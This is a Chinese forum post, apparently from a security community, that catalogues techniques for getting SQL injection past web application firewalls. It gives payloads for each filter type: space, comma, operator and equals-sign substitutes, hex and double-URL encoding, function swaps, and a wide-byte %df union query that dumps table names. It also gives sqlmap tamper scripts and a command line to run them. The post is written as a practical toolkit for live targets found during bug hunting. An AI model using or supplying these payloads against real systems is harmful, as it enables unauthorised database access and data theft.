sql注入绕过与sqlmap绕过使用总结
====================

前言
--

最近挖edusrc的时候遇到有注入点但是有waf绕不过，头疼。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-9b5017eb2ae4ec92c20e359ed61f6f9d0036489a.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-9b5017eb2ae4ec92c20e359ed61f6f9d0036489a.png)  
可以看到还是phpstudy建站的，太熟悉了这个，不知道这个什么waf各位师傅知道的可以评论一下，所以写这篇文章是供各位师傅在实战中遇到waf可以看一看，能给各位师傅一点帮助，所以就想着写一篇。

还有一个很有可能是有注入点的但是，用了很多注入语句都不行，不知道怎么回事  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-566658d18fb28c4a52ff89dd108378c64af240c4.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-566658d18fb28c4a52ff89dd108378c64af240c4.png)  
后面再去慢慢研究。

正文
--

### 手动绕过

一：空格被过滤  
当空被过滤掉的时候（也就是被删掉的意思）问你就可以使用编码或者注释进行绕过

```php
%20,%09,/**/  /*注释*/%0a,%0b,%0c,%0d,%a0
```

二：空格被过滤，括号未被过滤

像这样的

```php
select(admin())from data where(1=1)and(2=2)
id=1%27and(sleep(ascii(mid(data()from(1)for(1)))=1))%23
```

ascii：用字符的ASCII码来寻找

这里用多个括号代表空格

三：逗号绕过---当我们需要用到offset、join、limit这些语句的时候。

使用join:

```php
union select 1,2
/代替成join
union select * from (select 1)a join (select 2)b
```

使用offset：

```php
limit 2,1代替成limit 1 offset 2
```

使用like:

```php
select ascii(mid(user(),1,1))=97
/使用like来寻找含有“a”的表（代替了上面的查询绕过了逗号）
select user() like 'a%'
```

四：or and not xor绕过

如果在测试过程中出现这三个被过滤我们可以用他们等价的语句进行注入

```php
'and'等价于'&&'   'or'等价于'||'    'xor'等价于'|'   'not'等价于'!'
```

五：等号绕过

```php
?id=1 or 1 like 1 /用like代替了等号
?id=1 or 1 rlike 1 /用rlike代替了等号
?id=1 or 1 regexp 1 /用regexp代替了等号
?id=1 or !(1 <> 1)或者1 !(<>) 1 /<> 等价于 != 所以在前面再加一个!结果就是等号了(双重否定变肯定)
```

六：编码绕过---前提条件是没有对编码进行过滤

```php
/16进制绕过
select * from users where username = user;
select * from users where username = 0x75736572;
/两次url全编码
1+and+1=2
1+%25%36%31%25%36%65%25%36%34+1=2 
```

七：函数代替绕过--当输入函数被禁止时

```php
/当一方函数被禁用时候就可以用另一边的函数进行注入
hex()、bin()等价于ascii()
sleep() 等价于benchmark()
concat_ws()等价于group_concat()
mid()、substr() 等价于substring()
@@user等价于user()
@@datadir 等价于atadir()
```

八：宽字节绕过--前提条件所输入的单双引号会被转义

```php
%df' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- qwe
```

这里我们在单引号前面了一个%df来绕过。

### sqlmap绕过

sqlmap中的tamper里面很多防过滤的脚本，都是很实用的  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-b8b5c14edc1eb5d379ba2ae4d9542eacf7e34c64.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-b8b5c14edc1eb5d379ba2ae4d9542eacf7e34c64.png)  
里面有很多类型的过滤，具体要实用那个脚本，我们要适当的手工测试  
例如  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1f1ef84685ce5632b49df84d57d2d84252fb8770.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1f1ef84685ce5632b49df84d57d2d84252fb8770.png)  
单引号没过滤，

再试一试其他的  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1a035010fdccdfbedcfd69d5bf6cec9d96e6d56d.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1a035010fdccdfbedcfd69d5bf6cec9d96e6d56d.png)  
等于号没过滤

还有很多可以尝试，就不一个个说了

下面说一下脚本的利用说明

```php
apostrophemask.py   用utf8代替引号       ("1 AND '1'='1") '1 AND %EF%BC%871%EF%BC%87=%EF%BC%871' 
base64encode.py     用base64编码替换       ("1' AND SLEEP(5)#")'MScgQU5EIFNMRUVQKDUpIw=='
multiplespaces.py   围绕SQL关键字添加多个空格     ('1 UNION SELECT foobar')'1    UNION     SELECT   foobar'
space2plus.py       用+替换空格              ('SELECT id FROM users')'SELECT+id+FROM+users'
nonrecursivereplacement.py  双重查询语句。取代predefined SQL关键字with       ('1 UNION SELECT 2--')'1 UNIOUNIONN
SELESELECTCT 2--'
space2randomblank.py    代替空格字符（“”）从一个随机的空白字符可选字符的有效集    ('SELECT id FROM users')
'SELECT%0Did%0DFROM%0Ausers'
unionalltounion.py    替换UNION ALL SELECT UNION SELECT         ('-1 UNION ALL SELECT')'-1 UNION SELECT'
securesphere.py     追加特制的字符串    ('1 AND 1=1')"1 AND 1=1 and '0having'='0having'"
```

还有很多师傅们可以到网上去查。

最后使用格式直接在语法里面加上--tamper "要使用的脚本"

例如：  
sqlmap.py -u "<http://www.xxxxx.com/test.php?id=1>" --delay=2 --random-agent --tamper "versionedmorekeywords.py"

要使用两个脚本的话就再加上去但是第一个后缀要去掉：--tamper "space2comment,versionedmorekeywords.py"

结语
--

在很多实战中都会有很多waf要绕过的，我们可以根据是什么waf来选择特定的来绕过，这样就不会浪费时间，一般判断是什么waf就指纹识别或者给个注入语句看看是什么拦截了。